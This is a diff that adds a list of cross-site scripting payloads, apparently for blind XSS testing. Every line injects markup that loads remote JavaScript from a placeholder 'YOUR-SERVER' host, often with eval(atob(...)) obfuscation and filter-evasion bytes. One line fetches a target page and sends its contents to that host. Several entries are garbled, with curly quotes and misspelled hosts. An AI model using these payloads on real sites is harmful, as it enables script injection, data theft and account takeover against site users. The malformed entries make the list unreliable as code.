@@ -1,0 +1,36 @@
+"><script src=https://YOUR-SERVER></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://YOUR-SERVER\';document.body.appendChild(a)')
+"><input onfocus=eval(atob(this.id)) id=var a=document.createElement("script");a.src="https://YOUR-SERVER";document.body.appendChild(a);. autofocus>
+"><img src=x id=var a=document.createElement("script");a.src="https://YOUR-SERVER";document.body.appendChild(a); onerror=eval(atob(this.id))>
+"><video><source onerror=eval(atob(this.id)) id=https://YOUR-SERVER";document.body.appendChild(a);>
+"><iframe srcdoc="<script>var a=parent.document.createElement("script");a.src="https://YOUR-SERVER";parent.document.body.appendChild(a);</script>">
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//YOUR-SERVER");a.send();</script>
+<script>$.getScript("//YOUR-SERVER")</script>
+<img src=http://YOUR-SERVER>
+<script>new Image().src=”http://Your-Server</script>
+‘“><img src=x onerror=fetch(‘///Your-Server)>.
+%22;fetch(%27https://www.Target.com/).then(a=%3E%20a.text()).then(a=%3E%20fetch(%27http://YOUR-Server))//
+<SCRIPT/XSS SRC="http://YOUR-SEVER"></SCRIPT>
+<SCRIPT/SRC="http://YOUR-SERVER"></SCRIPT>
+'"></tittle></textarea></script></style></noscript><script src=http://YOUR-SERVER></script>
+<script\x20src=https://YOUR-SERVER</script>
+<script\x3Esrc=https://YOUR-SERVER</script>
+<script\x0Dsrc=https://YOUR-SERVER</script>
+<script\x09src=https://YOUR-SERVER</script>
+<script\x0Csrc=https://YOUR-SERVER</script>
+<script\x2Fsrc=https://YOUR-SERVER</script>
+<script\x0Asrc=https://YOUR-SERVER</script>
+'`"><\x3Cscriptsrc=http://YOUR-SERVER>javascript:prompt(1)</script>     
+<!--\x3E<img src=xxx:x onerror=javascript:prompt(1)> -->
+--><!-- ---> <img src=http://YOUR-SERVER onerror=javascript:prompt(1)> -->
+--><!-- --\x00> <img src=http://YOUR-SERVER onerror=javascript:prompt(1)> -->
+--><!-- --\x21> <img src=http://YOUR-SERVER onerror=javascript:prompt(1)> -->
+--><!-- --\x3E> <img src=http://YOUR-SERVER onerror=javascript:prompt(1)> -->  
+<svg xmlns="#"><script src=http://YOUR-SERVER>confirm(1)</script></svg>
+<svg src=x" d=var a=document.createElement("script");a.src="https://YOUR-SERVER";document.body.appendChild(a); onerror=eval(atob(this.id)) xmlns="#"></svg>
+<img onerror=&#96alert(1)&#96src=http://YOUR-SERVER>
+&#174input onsubmit=eval(atob(this.id)) id=var a=document.createElement("script");a.src="https://YOUR-SERVER";document.body.appendChild(a);.&#175
+<iframe src=jaVaScrIpT:eval(atob(‘http://YOUR-SEVER’))>
+<style>@keyframes slidein {}</style><svg style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration=http://YOUR-SERVER></svg>
+<svg xmlns="http://www.w3.org/2000/svg" src=https://YOUR-SERVER/>
+
